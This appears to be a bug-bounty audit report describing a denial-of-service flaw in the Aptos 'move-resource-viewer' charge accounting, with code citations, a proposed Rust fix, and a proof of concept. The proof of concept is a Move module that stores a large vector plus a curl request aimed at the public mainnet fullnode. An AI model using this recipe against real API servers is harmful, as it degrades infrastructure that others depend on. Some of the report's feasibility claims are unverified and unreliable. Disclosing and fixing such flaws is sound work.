# Audit Report

## Title
Resource Viewer Amplification Attack: Inadequate Charge Accounting Enables API Server DoS

## Summary
The `move-resource-viewer` library's `Limiter::charge()` mechanism fails to account for actual data content and serialization expansion, charging only for type metadata and field names. This enables attackers to cause excessive CPU, memory, and bandwidth consumption on API servers by querying resources with large data payloads that incur minimal charges.

## Finding Description

The vulnerability exists in how the `Limiter` tracks resource consumption during resource viewing operations exposed through the REST API endpoint `/accounts/{address}/resource/{resource_type}`. [1](#0-0) 

The `charge()` function simply decrements a budget counter, but the **cost calculation is fundamentally flawed**. When processing resources, charges are applied only for:

1. Type metadata (AccountAddress, module name, struct name): [2](#0-1) 

2. Field and variant names: [3](#0-2) 

**No charges are applied for:**
- Actual data values (primitive types, addresses, large integers)
- Vector lengths or element counts
- Nesting depth of recursive structures
- Output serialization size (JSON expansion)

The critical flow occurs in `view_resource_with_limit()`: [4](#0-3) 

The blob is deserialized without size accounting, then annotated recursively. During annotation, vectors process all elements without charging: [5](#0-4) 

**Attack Scenario:**

1. Attacker deploys a Move module with a struct like:
```move
struct Exploit has key {
    v: vector<u8>  // Single char field name = 1 byte charge
}
```

2. Stores a resource instance with `v` containing 50MB of data

3. Calls API: `GET /accounts/{address}/resource/{address}::exploit::Exploit` with `Accept: application/json`

4. API flow executes: [6](#0-5) 

5. Charges applied:
   - AccountAddress: 32 bytes
   - Module name "exploit": 7 bytes  
   - Struct name "Exploit": 7 bytes
   - Field name "v": 1 byte
   - **Total: ~47 bytes charged**

6. Actual resource consumption:
   - Deserialize 50MB blob into `MoveValue` tree
   - Allocate memory for `AnnotatedMoveValue` structures
   - Serialize to JSON (for `vector<u8>`, converts to hex encoding = 100MB output)
   - **Total: ~150MB memory + CPU for serialization**

The 100MB default limit is meaningless since charges are based on metadata (~47 bytes) not actual data (50MB+).

## Impact Explanation

**Severity: High** - Maps to "API crashes" category in the Aptos Bug Bounty Program.

This vulnerability enables denial-of-service attacks against Aptos API servers through:

1. **CPU Exhaustion**: Deserializing large blobs and recursively building annotation trees
2. **Memory Exhaustion**: Allocating `AnnotatedMoveValue` structures for massive datasets
3. **Bandwidth Exhaustion**: Serializing huge JSON responses (with 2x amplification for hex-encoded bytes)
4. **Cascading Failures**: Multiple concurrent malicious requests can crash API nodes

While this doesn't directly impact consensus or validator operations, it affects the availability of public-facing infrastructure that applications and users depend on. API server crashes can:
- Prevent transaction submission
- Block account/resource queries
- Disrupt indexer operations
- Degrade user experience across the ecosystem

## Likelihood Explanation

**Likelihood: High**

This attack is highly likely to be exploited because:

1. **No privilege required**: Any user can deploy Move modules and create resources
2. **Trivial to execute**: Single API call triggers the vulnerability
3. **Low cost**: Attacker pays only normal storage costs for the resource
4. **High impact**: Can DoS multiple API servers with few resources
5. **Difficult to detect**: Appears as legitimate API traffic until servers crash
6. **No rate limiting**: The Limiter mechanism is bypassed, so standard rate limits may not prevent exploitation

## Recommendation

Implement comprehensive charge accounting that includes actual data content:

```rust
// In lib.rs, modify annotate_value to charge for data:
fn annotate_value(
    &self,
    value: &MoveValue,
    ty: &FatType,
    limit: &mut Limiter,
) -> anyhow::Result<AnnotatedMoveValue> {
    // Charge for the value size before processing
    let value_size = self.estimate_value_size(value);
    limit.charge(value_size)?;
    
    Ok(match (value, ty) {
        // existing match arms...
        (MoveValue::Vector(a), FatType::Vector(ty)) => {
            // Vector already charged above via estimate_value_size
            match ty.as_ref() {
                FatType::U8 => AnnotatedMoveValue::Bytes(
                    a.iter()
                        .map(|v| match v {
                            MoveValue::U8(i) => Ok(*i),
                            _ => Err(anyhow!("unexpected value type")),
                        })
                        .collect::<anyhow::Result<_>>()?,
                ),
                _ => AnnotatedMoveValue::Vector(
                    ty.type_tag(limit).unwrap(),
                    a.iter()
                        .map(|v| self.annotate_value(v, ty.as_ref(), limit))
                        .collect::<anyhow::Result<_>>()?,
                ),
            }
        },
        // ... rest of match arms
    })
}

fn estimate_value_size(&self, value: &MoveValue) -> usize {
    match value {
        MoveValue::U8(_) => 1,
        MoveValue::U16(_) => 2,
        MoveValue::U32(_) | MoveValue::I32(_) => 4,
        MoveValue::U64(_) | MoveValue::I64(_) => 8,
        MoveValue::U128(_) | MoveValue::I128(_) => 16,
        MoveValue::U256(_) | MoveValue::I256(_) => 32,
        MoveValue::Bool(_) => 1,
        MoveValue::Address(_) => 32,
        MoveValue::Vector(v) => {
            v.iter().map(|x| self.estimate_value_size(x)).sum()
        },
        MoveValue::Struct(s) => {
            s.optional_variant_and_fields().1.iter()
                .map(|x| self.estimate_value_size(x))
                .sum()
        },
        MoveValue::Signer(_) => 32,
        MoveValue::Closure(c) => {
            c.captured.iter()
                .map(|(_, v)| self.estimate_value_size(v))
                .sum()
        },
    }
}
```

Additionally, consider:
1. Setting a maximum blob size before deserialization
2. Implementing output size limits for JSON serialization
3. Adding rate limiting specifically for resource viewing operations
4. Monitoring API response sizes to detect anomalies

## Proof of Concept

```move
// File: sources/exploit.move
module attacker::exploit {
    use std::vector;
    
    struct BigData has key {
        // Single character field name minimizes charges
        d: vector<u8>,
    }
    
    public entry fun create_large_resource(account: &signer) {
        let big_vec = vector::empty<u8>();
        let i = 0;
        // Create 10MB vector (adjust size as needed)
        while (i < 10_000_000) {
            vector::push_back(&mut big_vec, 0xFF);
            i = i + 1;
        };
        
        move_to(account, BigData { d: big_vec });
    }
}
```

**Exploitation steps:**

1. Compile and publish the module to an account
2. Call `create_large_resource()` to store a resource with 10MB of data
3. Issue API request:
   ```bash
   curl "https://fullnode.mainnet.aptoslabs.com/v1/accounts/0x{address}/resource/0x{address}::exploit::BigData" \
     -H "Accept: application/json"
   ```
4. Observe:
   - Limiter charges: ~40 bytes (address + "exploit" + "BigData" + "d")
   - Actual processing: 10MB deserialization + 20MB JSON hex output
   - Memory spike and potential server crash with concurrent requests

**Expected Result**: API server experiences high CPU/memory usage and slow response time. Multiple concurrent requests can crash the server, while the Limiter reports charges of only ~40 bytes per request.

## Notes

This vulnerability is specifically in the `move-resource-viewer` library used by the Aptos API layer, not in consensus or VM execution. While it doesn't directly threaten blockchain safety, it compromises the availability of critical infrastructure services. The fix requires rethinking the charging model to account for actual computational and memory costs, not just type metadata sizes.

### Citations

**File:** third_party/move/tools/move-resource-viewer/src/limit.rs (L13-20)
```rust
    pub fn charge(&mut self, cost: usize) -> PartialVMResult<()> {
        if self.0 < cost {
            return Err(PartialVMError::new(StatusCode::ABORTED)
                .with_message("Query exceeds size limit".to_string()));
        }
        self.0 -= cost;
        Ok(())
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/fat_type.rs (L185-187)
```rust
        limiter.charge(std::mem::size_of::<AccountAddress>())?;
        limiter.charge(self.module.as_bytes().len())?;
        limiter.charge(self.name.as_bytes().len())?;
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L344-354)
```rust
    pub fn view_resource_with_limit(
        &self,
        tag: &StructTag,
        blob: &[u8],
        limit: &mut Limiter,
    ) -> anyhow::Result<AnnotatedMoveStruct> {
        let ty = self.resolve_struct_tag(tag, &mut Limiter::default())?;
        let struct_def = (ty.as_ref()).try_into().map_err(into_vm_status)?;
        let move_struct = MoveStruct::simple_deserialize(blob, &struct_def)?;
        self.annotate_struct(&move_struct, &ty, limit)
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L742-747)
```rust
        if let Some((_, name)) = &variant_info {
            limit.charge(name.as_bytes().len())?;
        }
        for name in field_names.iter() {
            limit.charge(name.as_bytes().len())?;
        }
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L910-915)
```rust
                _ => AnnotatedMoveValue::Vector(
                    ty.type_tag(limit).unwrap(),
                    a.iter()
                        .map(|v| self.annotate_value(v, ty.as_ref(), limit))
                        .collect::<anyhow::Result<_>>()?,
                ),
```

**File:** api/src/state.rs (L306-318)
```rust
        match accept_type {
            AcceptType::Json => {
                let resource = state_view
                    .as_converter(self.context.db.clone(), self.context.indexer_reader.clone())
                    .try_into_resource(&tag, &bytes)
                    .context("Failed to deserialize resource data retrieved from DB")
                    .map_err(|err| {
                        BasicErrorWith404::internal_with_code(
                            err,
                            AptosErrorCode::InternalError,
                            &ledger_info,
                        )
                    })?;
```
